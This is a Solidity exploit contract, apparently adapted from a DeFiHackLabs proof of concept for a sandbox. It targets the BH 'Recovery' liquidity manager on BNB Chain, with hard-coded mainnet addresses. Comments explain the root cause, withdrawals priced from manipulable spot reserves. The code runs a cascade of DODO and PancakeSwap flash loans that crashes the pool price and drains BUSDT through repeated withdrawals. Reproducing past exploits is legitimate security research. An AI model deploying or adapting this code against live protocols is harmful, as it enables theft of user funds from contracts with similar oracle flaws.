// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-10-BH).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest is Test`
// contract: testExploit() kicks off a nested cascade of flash loans/swaps, and the
// callbacks (DPPFlashLoanCall / pancakeCall / pancakeV3FlashCallback) all live on
// the test contract itself. There is therefore no standalone contract to deploy.
// This contract is a faithful, cheatcode-free copy of that inline attack
// (testExploit body + all three callbacks copied verbatim under one entrypoint
// `run`, with `deal`/`emit log_*`/`vm.label` dropped since they are cosmetic or
// no-ops for a freshly deployed contract that already starts at 0 balance).
// Logic and constants are copied verbatim from test/BH_exp.sol.
//
// Root cause: the unverified "Recovery" liquidity manager
// (0x8cA7835aa30b025b38A59309DD1479d2F452623a) lets a user deposit BUSDT
// (selector 0x33688938) and later withdraw (selector 0x4e290832). Deposit adds
// BUSDT+BH liquidity to the BUSDT/BH PancakePair and records the caller's
// principal at the pool's CURRENT ratio. Withdraw sizes the LP redemption (and
// therefore the BUSDT paid out) from the pool's INSTANTANEOUS spot reserves at
// call time -- not from the recorded principal and not from any manipulation-
// resistant oracle. Because deposit and withdraw are both callable within the
// same transaction, an attacker can straddle a self-induced price move: deposit
// at the honest price, crash the price with a flash-funded swap, withdraw
// repeatedly at the manipulated price, repay every flash loan, and keep the
// difference.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakePairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IRecoveryManager {
    function Upgrade(address lpToken) external;
}

contract BHDrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BH = IERC20(0xCC61CC9F2632314c9d452acA79104DDf680952b5);
    IDPPOracle constant DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle constant DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle constant DPPOracle3 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDPPOracle constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IPancakePairV2 constant WBNB_BUSDT = IPancakePairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePairV3 constant BUSDT_USDC = IPancakePairV3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    IRecoveryManager constant manager = IRecoveryManager(0x8cA7835aa30b025b38A59309DD1479d2F452623a);
    IPancakeRouterV2 constant router = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant lpToken = 0xdbC27f2e9a2532b15C848F4Ae408cfE8BeB14959;
    address constant sink = 0x5b9dd1De70320B1EA6C8BBebA12bf4e246227999;
    address constant busdtBhPair = 0x2371E4Ad771020CE3D8252f1db3e5559FbA8eeb5;

    // Entrypoint. Kicks off the 5-deep DODO flash-loan cascade; the cascade's
    // final leg opens a PancakeV2 flash swap, which itself opens a PancakeV3
    // flash, whose callback runs the actual deposit/manipulate/withdraw attack
    // against the Recovery manager. By the time this call returns, every flash
    // loan has been repaid and the surplus BUSDT sits in this contract's own
    // balance.
    function run() external {
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), abi.encode(uint256(0)));
    }

    // DODO flash-loan callback -- walks 4 more nested DODO pools, then hands
    // off to the PancakeV2 flash swap, before repaying its own borrow.
    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        uint256 stage = abi.decode(data, (uint256));
        if (stage == 0) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), abi.encode(uint256(1)));
        } else if (stage == 1) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), abi.encode(uint256(2)));
        } else if (stage == 2) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), abi.encode(uint256(3)));
        } else if (stage == 3) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), abi.encode(uint256(4)));
        } else {
            WBNB_BUSDT.swap(10_000_000 * 1e18, 0, address(this), abi.encode(uint256(0)));
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    // PancakeV2 flash-swap callback -- opens the PancakeV3 flash, then repays
    // the V2 swap (borrowed amount0 + a fixed buffer) out of the BUSDT the V3
    // flash callback will have extracted from the manager.
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        BUSDT_USDC.flash(address(this), 15_000_000 * 1e18, 0, abi.encode(uint256(0)));
        BUSDT.transfer(address(WBNB_BUSDT), amount0 + 60_000 * 1e18);
    }

    // PancakeV3 flash callback -- this is where the actual exploit against the
    // Recovery manager happens: register, deposit at the honest price, crash
    // the price, withdraw repeatedly at the manipulated price, then repay the
    // V3 flash.
    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        BUSDT.approve(address(manager), type(uint256).max);
        BUSDT.approve(address(router), type(uint256).max);
        BH.approve(address(manager), type(uint256).max);

        // Register / accrue a manager position (escalating BUSDT fee each call).
        for (uint8 i = 0; i < 12; i++) {
            manager.Upgrade(lpToken);
        }

        // Deposit at the honest pool ratio -- records the attacker's principal.
        (bool success,) = address(manager).call(abi.encodeWithSelector(bytes4(0x33688938), 3_000_000 * 1e18));
        require(success, "Call to function with selector 0x33688938 fail");

        // Crash the BH spot price by dumping 22M BUSDT into the pair.
        _dumpBUSDTForBH();

        // Withdraw 10x. Each call sizes its LP redemption off the pair's
        // CURRENT (now manipulated) BH balance, so the manager pays out far
        // more BUSDT than the deposited principal is actually worth.
        for (uint8 i = 0; i < 10; i++) {
            uint256 lpAmount = (BH.balanceOf(busdtBhPair) * 55) / 100;
            (success,) = address(manager).call(abi.encodeWithSelector(bytes4(0x4e290832), lpAmount));
            require(success, "Call to function with selector 0x4e290832 fail");
        }

        BUSDT.transfer(address(BUSDT_USDC), 15_000_000 * 1e18 + fee0);
    }

    function _dumpBUSDTForBH() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(BH);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            22_000_000 * 1e18, 0, path, sink, block.timestamp + 100
        );
    }
}
